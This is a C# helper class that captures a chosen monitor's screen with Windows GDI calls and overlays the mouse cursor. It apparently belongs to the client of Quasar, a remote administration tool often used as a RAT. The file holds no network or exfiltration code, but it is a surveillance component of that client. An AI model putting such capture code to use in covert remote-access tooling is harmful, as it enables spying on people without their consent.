using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Quasar.Client.Utilities;

namespace Quasar.Client.Helper
{
    public static class ScreenHelper
    {
        private const int SRCCOPY = 0x00CC0020;
        private const int CAPTUREBLT = unchecked((int)0x40000000);

        public static Bitmap CaptureScreen(int screenNumber)
        {
            return CaptureScreen(new CaptureOptions { DisplayIndex = screenNumber });
        }

        public static Bitmap CaptureScreen(CaptureOptions options)
        {
            if (options == null)
                throw new ArgumentNullException(nameof(options));

            Rectangle bounds = GetBounds(options.DisplayIndex);
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);

            using (Graphics g = Graphics.FromImage(screen))
            {
                IntPtr destDeviceContext = g.GetHdc();
                IntPtr srcDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);

                NativeMethods.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,
                    bounds.Y, SRCCOPY | CAPTUREBLT);

                NativeMethods.DeleteDC(srcDeviceContext);
                g.ReleaseHdc(destDeviceContext);
            }

            if (options.IncludeCursor)
                TryDrawCursor(screen, bounds);

            return screen;
        }

        public static Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }

        private static void TryDrawCursor(Bitmap target, Rectangle bounds)
        {
            if (target == null)
                return;

            var cursorInfo = new NativeMethods.CURSORINFO { cbSize = Marshal.SizeOf(typeof(NativeMethods.CURSORINFO)) };
            if (!NativeMethods.GetCursorInfo(out cursorInfo))
                return;

            if ((cursorInfo.flags & NativeMethods.CURSOR_SHOWING) != NativeMethods.CURSOR_SHOWING)
                return;

            int cursorX = cursorInfo.ptScreenPos.X - bounds.X;
            int cursorY = cursorInfo.ptScreenPos.Y - bounds.Y;

            if (cursorX < 0 || cursorY < 0 || cursorX >= bounds.Width || cursorY >= bounds.Height)
                return;

            IntPtr cursorHandle = NativeMethods.CopyIcon(cursorInfo.hCursor);
            if (cursorHandle == IntPtr.Zero)
                cursorHandle = cursorInfo.hCursor;

            try
            {
                if (NativeMethods.GetIconInfo(cursorHandle, out var iconInfo))
                {
                    cursorX -= iconInfo.xHotspot;
                    cursorY -= iconInfo.yHotspot;

                    if (iconInfo.hbmMask != IntPtr.Zero)
                        NativeMethods.DeleteObject(iconInfo.hbmMask);
                    if (iconInfo.hbmColor != IntPtr.Zero)
                        NativeMethods.DeleteObject(iconInfo.hbmColor);
                }

                using (Graphics cursorGraphics = Graphics.FromImage(target))
                {
                    IntPtr hdc = cursorGraphics.GetHdc();
                    try
                    {
                        NativeMethods.DrawIconEx(hdc, cursorX, cursorY, cursorHandle, 0, 0, 0, IntPtr.Zero, NativeMethods.DI_NORMAL);
                    }
                    finally
                    {
                        cursorGraphics.ReleaseHdc(hdc);
                    }
                }
            }
            finally
            {
                if (cursorHandle != IntPtr.Zero && cursorHandle != cursorInfo.hCursor)
                    NativeMethods.DestroyIcon(cursorHandle);
            }
        }

        public sealed class CaptureOptions
        {
            public int DisplayIndex { get; set; }
            public bool IncludeCursor { get; set; } = true;
        }
    }
}
